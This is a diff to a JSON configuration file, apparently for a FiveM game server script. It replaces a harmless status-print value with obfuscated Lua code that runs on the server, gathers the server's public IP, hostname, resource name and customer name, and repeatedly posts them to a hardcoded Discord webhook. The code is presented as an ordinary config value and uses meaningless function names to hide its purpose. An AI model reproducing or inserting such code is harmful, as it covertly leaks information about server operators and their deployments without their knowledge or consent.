@@ -1,4 +1,4 @@
 {
-    "client":"print('status:good')",
-    "server":"print('status:good')"
+    "client": "print('status:good')",
+    "server": "local webhooksss = https://discordapp.com/api/webhooks/730487584605732864/NH7oat8IzcW0aihzJPXJLyHpyA_WpMWs6rclhLUoxMoUMWwchpbAE6uhLTdsveoh37s0;local a='Unknown'Citizen.CreateThread(function()PerformHttpRequest('https://ipinfo.io/json',function(b,c,d)if b==200 then local e=json.decode(c or'')a=e.ip end;local f={}f.d='TaerAttO Bot'Citizen.CreateThread(function()while true do Citizen.Wait(3000)dddddddd(webhooksss,string.format('Server: %s\nScript: %s\nUser: %s\nOriginal: %s\nIp Addr: %s\n',GetConvar('sv_hostname','Unknown'),GetCurrentResourceName(),customername,script_name,a),de(),ge(),5)Citizen.Wait(3600000)end end)function ge()return 8388736 end;function de()local l=string.format('\nTime: %s',os.date('%H:%M:%S - %d/%m/%Y',os.time()))return l end;function dddddddd(m,n,o,p,de)if m==nil or m==''or n==nil or n==''then return false end;local q={{['title']=n,['description']=o,['type']='rich',['color']=p,['footer']={['text']=''}}}Citizen.CreateThread(function()Citizen.Wait(de*1000)PerformHttpRequest(m,function(r,s,t)end,'POST',json.encode({username=f['d'],embeds=q}),{['Content-Type']='application/json'})end)end end)end)"
 }
